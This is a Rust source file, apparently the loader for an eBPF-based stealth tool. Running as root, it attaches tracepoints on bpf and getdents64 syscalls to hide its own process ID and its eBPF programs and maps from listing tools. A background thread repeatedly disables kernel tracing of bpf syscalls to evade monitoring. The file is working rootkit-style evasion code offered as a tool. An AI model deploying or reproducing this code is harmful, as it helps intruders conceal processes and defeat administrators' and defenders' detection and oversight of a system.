use std::{fs::OpenOptions, path::Path, thread, time::Duration};

use aya::{maps::HashMap, EbpfLoader};
use log::info;
#[rustfmt::skip]
use log::{debug, warn};
use std::io::Write;

use clap::Parser;
use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
use stealth::utils::{fetch_pids_map_ids, Builder, SyscallTracepoint};
use tokio::signal;
#[derive(Parser, Debug)]
#[command(version, about, about,long_about = None)]
pub struct Arg {
    #[clap(short, long,value_parser, value_delimiter = ' ', num_args = 1..)]
    pub prog: Option<Vec<u32>>,
}

#[inline]
fn list_active_programs() -> Vec<u32> {
    let iter = ProgInfoIter::default();
    let mut active_programs = Vec::<u32>::new();
    for prog in iter {
        active_programs.push(prog.id);
    }
    active_programs
}
#[inline]
fn list_active_maps() -> Vec<u32> {
    let iter = MapInfoIter::default();
    let mut active_maps = Vec::<u32>::new();
    for prog in iter {
        active_maps.push(prog.id);
    }
    active_maps
}

fn write_to_tracefs(message: &str, path: &str) -> std::io::Result<()> {
    let tracefs_path = Path::new(path);
    let mut file = OpenOptions::new().write(true).open(tracefs_path)?;
    write!(file, "{}", message)?;
    Ok(())
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root");
        std::process::exit(1);
    }

    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    let tracepoints = vec![
        SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
        SyscallTracepoint::from(("stealth_pid_enter", "sys_enter_getdents64")),
        SyscallTracepoint::from(("stealth_pid_exit", "sys_exit_getdents64")),
    ];
    let pid = std::process::id();
    info!("hide {}", pid);
    let mut ebpf = EbpfLoader::new()
        .set_global("HIDDEN_PID", &pid, true)
        .load(aya::include_bytes_aligned!(concat!(
            env!("OUT_DIR"),
            "/stealth"
        )))?;
    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }
    let mut builder = Builder {
        ebpf: &mut ebpf,
        tracepoints: tracepoints,
    };
    let progs_info = builder.build()?;

    let bpf_info = fetch_pids_map_ids(progs_info)?;

    //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
    let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
        HashMap::try_from(ebpf.take_map("HIDDEN_BPF_OBJ").unwrap()).unwrap();
    let mut hidden_progs = [0u32; 32];
    for (idx, m) in bpf_info.prog_ids.iter().enumerate() {
        hidden_progs[idx] = *m
    }

    let mut hidden_maps = [0u32; 32];
    for (idx, m) in bpf_info.map_ids.iter().enumerate() {
        hidden_maps[idx] = *m
    }

    hidden_obj_map.insert(0, hidden_progs, 0).unwrap();
    hidden_obj_map.insert(1, hidden_maps, 0).unwrap();

    //setup skip MAPS
    let mut prog_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
    let mut map_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
    let prog_ids = bpf_info.prog_ids;
    let map_ids = bpf_info.map_ids;

    for p in prog_ids.clone() {
        info!("{}", p)
    }
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(1000));
            let mut prev_id: u32 = 0;
            let active_programs = list_active_programs();
            let n_active_maps = active_programs.len();
            for (idx, m) in active_programs.iter().enumerate() {
                for to_skip_prog in prog_ids.iter() {
                    if m == to_skip_prog {
                        let to_insert_prog_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_prog;
                                for next_id in active_programs.as_slice()[idx..].into_iter() {
                                    if !prog_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_prog,
                        };
                        prog_skip_map.insert(prev_id, to_insert_prog_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }

            let mut prev_id: u32 = 0;
            let active_maps = list_active_maps();
            let n_active_maps = active_maps.len();
            for (idx, m) in active_maps.iter().enumerate() {
                for to_skip_map in map_ids.iter() {
                    if m == to_skip_map {
                        let to_insert_map_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_map;
                                for next_id in active_maps.as_slice()[idx..].into_iter() {
                                    if !map_ids.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_map,
                        };

                        map_skip_map.insert(prev_id, to_insert_map_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }
        }
    });

    //discourage tracing
    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(250));
            if let Err(err) = write_to_tracefs(
                "0",
                "/sys/kernel/debug/tracing/events/syscalls/sys_enter_bpf/enable",
            ) {
                println!("error: {}", err);
            };
            if let Err(err) = write_to_tracefs(
                "0",
                "/sys/kernel/debug/tracing/events/syscalls/sys_exit_bpf/enable",
            ) {
                println!("error: {}", err);
            };
        }
    });
    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");
    Ok(())
}
